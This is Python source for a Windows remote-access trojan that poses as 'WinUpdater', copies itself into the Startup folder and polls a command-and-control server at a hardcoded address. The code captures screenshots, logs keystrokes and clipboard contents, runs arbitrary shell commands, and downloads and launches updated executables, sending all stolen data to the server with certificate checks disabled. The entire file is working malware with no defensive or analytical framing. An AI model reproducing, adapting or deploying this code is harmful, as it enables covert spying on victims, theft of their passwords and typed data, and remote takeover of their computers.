from pynput import keyboard
from datetime import datetime
from mss import mss
from PIL import Image
from io import BytesIO
from threading import Thread
from time import sleep
from requests import post, get, packages
from base64 import b64encode, b64decode
from json import dumps, dump, load, loads
import pyperclip
from random import randint
from uuid import uuid4
from win32 import win32api
from getpass import getuser
from subprocess import Popen, PIPE, STDOUT
import os
import socket
import shutil
import json

from urllib3.exceptions import InsecureRequestWarning
packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def main():
    try:
        os.system(f'del WinUpdater{version-0.01}.exe')
    except:
        pass
    url = 'https://192.168.200.108:4433/'
    creds = ('bot','botsupersecretpassword')
    user = getuser()
    volinformation = win32api.GetVolumeInformation('C:\\')[1]
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    botid = user+'@'+str(volinformation)
    properties = {"bot_id":botid, "version":version, "hostname":hostname,"ip":ip}
    currentPath = os.getcwd()
    startupPath = os.path.join('C:\\', 'Users', user, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    try:
        if currentPath != startupPath:
                shutil.copy2(f'WinUpdater{version}.exe', startupPath)
    except:
        pass

    periodicCheck(url, creds, properties)

def printscreen(arguments, request_id, creds, url, bot_id):
    outputData = {"request_id":request_id, "bot_id":bot_id, "data":{}, "request_type":"printscreen"}
    count = 0
    try:
        for numPrints in range(arguments['num_prints']):
            if count == 5:
                print('sending 5')
                outputData["status"] = "not_done"
                sleep(randint(1,120))
                sendOutput(outputData, creds, url)
                count = 0
                outputData["data"] = {}
            with mss() as sct:
                sct.compression_level = 8
                for num, monitor in enumerate(sct.monitors[1:], 1):
                    sct_img = sct.grab(monitor)
                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                    now = datetime.now()
                    outputFile = "screenshot--{}.png".format(now.strftime("%Y%m%d %H%M%S"))
                    with BytesIO() as output:
                        img.save(output, 'PNG')
                        imgBytes64 = b64encode(output.getvalue()).decode()
            outputData["data"][outputFile] = imgBytes64
            count += 1
            sleep(arguments['interval'])
        outputData["status"] = "done"
    except:
        outputData["status"] = "error"
        outputData["data"] = ""
    sendOutput(outputData, creds, url)

def kl(arguments, request_id, creds, url, bot_id):
    global listener
    global klon
    global temps
    global keylog
    global outputDataKl

    temps = []
    keylog = ''
    klon = True
    outputDataKl = {"request_id":request_id, "bot_id":bot_id, "request_type":"keylog"}
    listener.start()

def klDump(arguments, request_id, creds, url, bot_id):
    global listener
    global keylog
    global temps
    outputDataKl = {"request_id":request_id, "bot_id":bot_id, "request_type":"keylog"}
    outputDataKl["status"] = "done"
    outputDataKl["data"] = b64encode(keylog.encode()).decode()
    sendOutput(outputDataKl, creds, url)
    temps = []
    keylog = ''

def klStop(arguments, request_id, creds, url, bot_id):
    global listener
    global keylog
    global outputDataKl
    global klon

    klon = False
    listener.stop()
    outputDataKl["data"] = b64encode(keylog.encode()).decode()
    outputDataKl["status"] = "done"
    sendOutput(outputDataKl, creds, url)
    outputData = {"request_id":request_id, "bot_id":bot_id, "request_type":"keylog"}
    outputData["data"] = []
    outputData["status"] = "done"
    sendOutput(outputData, creds, url)

def on_press(key):
        global keylog
        global temps
        try:
            keylog += key.char
            temps.append(key.char)
        except AttributeError:
            keylog += ' '+key.name+' '
            temps.append(key.name)
        except:
            pass

def on_release(key):
    global temps
    global keylog
    if len(temps) == 2 and (temps[0] == 'ctrl_l' and temps[1] == 'c'):
        keylog += '\n##############################\n' + pyperclip.paste() + '\n##############################\n'
    temps = []

def cmdexec(arguments, request_id, creds, url, bot_id):
    outputData = {"request_id":request_id, "bot_id":bot_id, "request_type":"cmdexec"}

    try:
        cmdresult = Popen(arguments['cmd'], shell=True, stdout=PIPE, stderr=STDOUT, stdin=PIPE)
        data = cmdresult.stdout.read()
    except Exception as e:
        outputData["status"] = "error"
        outputData["data"] = ""
        sendOutput(outputData, creds, url)
        return False

    outputData["status"] = "done"
    outputData["data"] = b64encode(data).decode()
    sendOutput(outputData, creds, url)

def periodicCheck(url, creds, properties):
    global klon
    proxy = None

    while True:
        try:
            req = post(url+'Check', auth=creds, verify=False, json=properties, proxies=proxy)
            reqJson = json.loads(req.content.decode().strip())
        except:
            sleep(randint(300,600))
            continue

        if reqJson['status'] == 'new':
            for task in reqJson['tasks']:
                func = task["request_type"]
                if func == 'keylog':
                    if task["arguments"]["cmd"] == 'start' and not klon:
                        func = 'kl'
                    elif task["arguments"]["cmd"] == 'stop' and klon:
                        func = 'klStop'
                    elif task["arguments"]["cmd"] == 'dump' and klon:
                        func = 'klDump'
                try:
                    Thread(target=eval(func), args=(task["arguments"], task["request_id"], creds, url, properties["bot_id"])).start()
                except:
                    pass
        elif reqJson['status'] == 'new_version':
            b64bot = reqJson["file"]
            newVersion = reqJson["version"]
            newVersionFile = b64decode(b64bot)
            currentPath = os.getcwd()
            newFileName = 'WinUpdater'+str(newVersion)+'.exe'
            try:
                with open(newFileName, 'wb') as botfile:
                    botfile.write(newVersionFile)
                os.chdir(currentPath)
                Popen(newFileName)
                exit(0)
            except:
                pass

        sleep(randint(300,600))

def sendOutput(data, creds, url):
        proxy = None
        sent = False
        count = 0

        while not sent and count < 50:
            try:
                post(url+'sendResult', json=data, verify=False, auth=creds, proxies=proxy)
                sent = True
            except Exception:
                count += 1
                sleep(randint(60, 120))
                continue

if __name__ == '__main__':
    temps = []
    listener = keyboard.Listener(on_press = on_press, on_release=on_release)
    keylog = ''
    klon = False
    version = 1.15
    main()
